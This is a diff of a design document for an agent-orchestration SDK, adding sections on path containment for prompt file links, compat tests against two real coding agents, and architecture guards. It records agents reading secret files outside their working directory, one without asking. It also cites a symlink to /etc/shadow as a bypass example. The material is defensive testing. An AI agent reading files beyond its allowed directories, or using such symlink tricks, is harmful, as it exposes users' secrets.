+the compat suite asserts the two modes agree on the recorded shapes. Windows: git emits POSIX separators in
+patch headers and we do **not** normalize the text; only the top-level path is normalized (`path.resolve`
+plus a case-fold on win32) for worktree keying.
+
+---
+
+## 26. Prompt-content path containment (M2-B; DESIGN §5.1)
+
+### 26.1 Why it must run before the prompt is sent
+
+F37 and F38 are the same lesson from both agents: **`resource_link` is accepted by both and contained by
+neither.**
+
+* claude-acp accepted `[text, resource_link(file://<cwd>/inside.txt), resource_link(file://<other
+  tmpdir>/outside.txt)]` with no error and no `promptCapabilities` complaint — `initialize` advertises
+  `{image: true, embeddedContext: true}` and says **nothing** about resource links. It expanded each link
+  into its own `Read`; the in-`cwd` read ran silently, and the out-of-`cwd` read raised a permission whose
+  only distinguishing marker is the vendor **string** `_meta.permission.description: "Reason: Path is outside
+  allowed working directories"`, with `kind` plain `read`. We answered `allow-once` and it echoed
+  `OUTSIDE-SECRET-BETA`.
+* codex-acp asked **nothing**, read **both** in one call reported `kind:"read"` with
+  `locations: [<inside only>]` and **no `rawInput` at all**, and dumped both files in `rawOutput`.
+
+So **downstream there is nothing to check**: one agent's marker is English (which `no-agent-prose` forbids us
+from branching on) and the other's audit trail omits the path entirely. Containment is ours, before the send,
+or it does not exist.
+
+### 26.2 The gate
+
+`assertPromptContent` runs inside `WorkerRegistry.prompt()` — **not** in zod, which holds neither this
+worker's `promptCapabilities` nor this token's `cwdRoots`, and DESIGN §5.1 requires both.
+
+| block | rule |
+| ----- | ---- |
+| `text` | always accepted |
+| `image` / `audio` | `400` unless the worker's `promptCapabilities` advertises it. Never forwarded |
+| `resource_link` / embedded `resource` | the uri must be a **string**, `file://`, **absolute**; then **realpath FIRST, then contain** — a symlink inside `cwd` pointing at `/etc/shadow` passes a string-prefix check and fails this one. The realpath must land inside the token's `cwdRoots`. **Not** gated on a capability: neither agent advertises anything for resource links and both accept them, so gating on `embeddedContext` would break both real agents for no security gain |
+| anything else | `400`, naming the type |
+
+The error message **elides the path**, so a probe cannot use the 400 to map the filesystem.
+
+Residual TOCTOU between our `realpath` and the agent's read is real, bounded (the agent reads seconds later)
+and recorded in §11.9. It is strictly better than M1's position, which was to forbid the block type entirely.
+
+**The `PromptRequestBody` refine deletion is the single most dangerous hunk in M2** (§11.9): a schema that
+silently stopped enforcing containment looks exactly like a schema that got more capable. Two guards cover it
+— the `assert-prompt-content-is-called` architecture test, and an integration test that posts an out-of-`cwd`
+link and asserts **both** the `400` **and** that the fixture agent recorded **zero** `session/prompt` calls.
+
+---
+
+## 27. The M2 compat cases and the new guards
+
+### 27.1 The constraint, restated for M2
+
+**Exactly two real ACP agents exist on this machine and no others may be installed**: `claude-acp`
+(`npx -y @agentclientprotocol/claude-agent-acp@0.73.0`, logged-in Claude Code) and `codex-acp`
+(`npx -y @agentclientprotocol/codex-acp@1.8.0`, ChatGPT login). §18's shape, selection and three-source skip
+taxonomy are unchanged; M2 adds six cases and one YAML key.
+
+The two agents **disagree about almost everything M2 is about** — claude asks permission and elicits, codex
+does neither — and that disagreement is the value: every case carries a `requires` list, and codex's
+interaction cases are printed `capability` skips sourced from its own README rather than silent passes.
+§11.9 records that "the same SDK code behaves identically" is still not falsifiable with two agents whose
+permission surfaces do not overlap.
+
+### 27.2 The cases
+
+| id | requires | claude-acp | codex-acp |
+| -- | -------- | ---------- | --------- |
+| `permission-allow` | `permission` | runs: allow the `edit`, assert the file exists **and** that `decision:"allow"` with an `optionId` drawn from `offered` | `capability` skip — its `unverified: [permission]` already says why: it never asks, in any mode, inside or outside the workspace |
+| `elicitation-gated` | `elicitation` | runs: a `park` worker gets `acp.interaction{method:"elicitation/create"}` and reaches `requires_action`; a `deny` **control** worker gets **none** and still ends `end_turn` — F28 reproduced live, asserted on our own outbound `initialize` bytes | `config` skip: *"no elicitation observed in 1.8.0; the adapter never asks for input"* |
+| `elicitation-answer` | `elicitation` | runs: answering `question_0` with a `oneOf[].const` creates **that** file, and the paired `_custom` property is **absent from the wire** — F30's regression, asserted on the recorded frames rather than on the SDK's own view | skip, same source |
+| `interaction-park-timeout` | `elicitation` | runs with `parkTimeoutMs: 5000` and nobody answering ⇒ `status:"expired"`, `verdict:"partial"`, the turn completes. **This case exists to DISCOVER what a real agent does with a long park (§11.9's first risk), not to confirm it, and it is the first M2 experiment to run** | skip, same source |
+| `config-set` | `configOptions` | `model` → the returned list **replaces** the old one, membership shrinks 4 → 2, and the next turn's `_meta.quota.model_usage[0].model` changes (F34) | runs: `mode` `agent → read-only` → replacement only. `expect.configEffectObservable: false` in the YAML, because F35 says `reasoning_effort` is **not observable at all** — a data row, not a code branch |
+| `watchdog-cancel` | `cancel` | a 30 s `python3 -c 'time.sleep(30)'` under a case-scoped `watchdog.toolMs: 8000` ⇒ `session/cancel`, `stopReason:"cancelled"`, `strandedToolCalls.length === 1` (F36), `verdict:"partial"`, and the aggregator never blocked | runs, same shape (`sleep 30`, F36's codex half) |
+| `watchdog-late-update` | — | `silentMs: 3000`: the post-response `session_info_update` (5–22 ms after, 7/7 — F25) does **not** trip the watchdog and the turn is not cancelled | runs: `threadStatus:{idle}` arrives **before** the response, which is the other half of the same anchor argument |
+| `prompt-resource-link` | — | a `resource_link` outside `cwdRoots` is `400` **and the agent recorded zero `session/prompt` calls** (F37) | runs, same assertion (F38) |
+| `patch-git` | `tools` | a write turn in a `tempRepo()` cwd yields a `patch` that `git apply --check` accepts; `tempNonRepo()` yields `null` + a named warning | runs, **plus** the `initRepoMidSession()` assertion F39 demands |
+| `webhook-run` | — | short run + `fakeWebhookReceiver()`: exactly one delivery, `Omni-Signature` verifies, `deliveryId` survives a mid-flight restart | runs |
+
+`agents.local.yaml` gains `provides: [elicitation, permission, configOptions]` for claude-acp and
+`provides: [configOptions]` for codex, plus the three `capability`/`config` skip rows above with reasons drawn
+from the recordings. A skip with no source is still a failure; `OMNI_COMPAT_REQUIRE=1` still fails an empty
+selection.
+
+### 27.3 Golden tests against the recorded corpus
+
+The highest-value tier, because they are real bytes, driven by `testkit/src/corpus.ts`. Every "F*n*" claim in
+§19–§26 is one of these:
+
+* claude `12`/`13` drive the interaction registry end to end through `wireAgent()`: accept produces **one**
+  `InteractionRecord` and **one** `ToolCallView` for the same `AskUserQuestion` id (F32), and decline produces
+  `decision:"deny"` **even though the tool call is `completed`** (F31).
+* `mapElicitation` over `12` and `13`'s exact `requestedSchema` bytes: the flat scope (F29), `oneOf` not
+  `enum`, the paired `_custom` property, no `required` array, `unmodelled: []`.
+* `buildElicitationContent({question_0:"notes.md"})` emits `question_0` **only**; a value outside `oneOf`
+  emits `question_0_custom` **only**; **both together is `400`** — the test is named for the file transcript
+  `12` wrongly created (F30).
+* claude `14` asserts that under `onUnresolved:"deny"` **no `elicitation` key appears in our outbound
+  `initialize` params** — D10's gate checked on our own bytes.
+* claude `15` and codex `07`: `configOptions` is **replaced**, claude's 4 → 2 shrink leaves no phantom
+  `effort`, codex's five stay five, and **no** `config_option_update` was consumed from the stream (F34, F35).
+* claude `16` and codex `08` fed to `watchdogStep` as their exact update sequences: the tool budget is still
+  armed at the cancel because no terminal update ever arrives, and `strandedToolCalls` is exactly the one open
+  id (F36).
+* claude `17` and codex `09`: an out-of-`cwd` `resource_link` is `400` at `POST /prompt` and the fixture agent
+  recorded zero `session/prompt` calls (F37, F38).
+* claude `11`: a human answer naming `allow-with-updates` is `400` under `allowAlways:"never"`; under
+  `"human"` it sets `policyBlinded` and warns on the **next** turn (F26).
+* The normalizer tolerates `session_info_update` — a kind with no row in DESIGN §6.1, present in 7 of 7 M2
+  claude runs and none of the 11 M1 runs — at `payloadVersion: 1`, forwarded by identity, and it counts as an
+  `envelope` signal for the watchdog (F25). codex's `messageId`-less banner chunk and its `terminal` content
+  block with no terminal capability declared both survive normalization without a warning (F41).
+
+### 27.4 New architecture guards
+
+Each is demonstrated **failing on a planted violation**, per §10.2's rule.
+
+| guard | rule |
+| ----- | ---- |
+| `policy-never-names-an-option` | `packages/core/src/policy/**` may not contain `optionId`, `allow_always`, `allow_once`, `reject_once` or `outcome`, and may not import `PermissionOption` (§20.1) |
+| `no-elicitation-schema-parse` | no `z.object(` / `.parse(` on elicitation params anywhere under `core/src/**` reached from an elicitation path — a schema parse would strip the `_meta` marker F30 turns on (§19.3) |
+| `interaction-id-is-daemon-minted` | no read of a JSON-RPC `id` as an interaction id (F33) |
+| `assert-prompt-content-is-called` | `WorkerRegistry.prompt` calls `assertPromptContent`; the deleted zod refine cannot go silently unreplaced (§26.2) |
+| `client-never-sends-a-command` | `CreateWorkerRequest["mcp"]` and `CreateRunRequest["mcp"]` are `string[]` at the type level, and no route constructs an `McpServerPreset` from a request body (§23.1) |
+| `webhook-body-is-thin` | the serialized delivery body has exactly the eight `WebhookPayload` keys (§24.3) |
+| `no-unbounded-outbound` | every `fetch` under `core/src/webhook/**` passes a `signal` and `redirect:"manual"` and never reads a response body (§24.4) |
+| `env-deny-is-one-table` | exactly one module declares `ENV_DENY_EXACT` / `ENV_DENY_PREFIX` (§23.3) |
+| `patch-runs-no-shell` | nothing under `core/src/diff/**` uses `shell:true` or a command string; git is reached only through `RunUtility` (§25.2) |
+| `no-agent-prose` **(extended)** | nothing under `core/src/{worker/interaction,policy}/**` may read `rawOutput`, `rawInput.description`, an option's `name` or any `_meta.*description` to decide an outcome. F27 and F31 are the two recordings of what that costs |
+| `descriptor-is-the-only-branch` **(extended)** | no agent-id string literal under `core/src/{worker/interaction,policy}/**` |
+| `http-has-no-logic` **(existing, recursive)** | covers the four new route modules for free |
+| `no-direct-spawn` **(existing, extended)** | now also proves `diff/git-provider.ts` reaches git only through the injected `RunUtility` |
+| `sse-is-unchanged` **(existing)** | `sse.ts`'s sha256 is unchanged by M2 — the Run API proxies the worker log rather than adding a stream writer |
